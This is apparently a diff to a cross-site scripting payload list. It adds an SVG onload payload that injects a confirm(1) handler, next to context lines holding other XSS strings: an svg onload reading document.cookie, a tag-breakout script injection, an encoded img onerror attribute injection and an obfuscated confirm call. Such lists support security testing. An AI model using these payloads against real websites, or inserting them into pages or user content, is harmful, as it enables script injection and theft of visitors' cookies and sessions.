@@ -160,3 +160,4 @@ orwa%27\"><svg/onload​=alert(document.cookie)>
 "></fieldset></form><script>prompt(/legionhunter/);</script></body></html><!--
 Testing%22+data-toggle%3Dcollapse+data-target%3D%3Cimg%26%23x20%3Bsrc%3Dx%26%23x20%3Bon%26%23x65%3Brror%3Dalert%28document.domain%29%26%23x3e%3B%22
 1"-top["con\146irm"](1)-"
+<svg xmlns="http://w3.org/2000/svg" onload​="this.setAttribute('onmouseover','confirm(1)')"></svg>
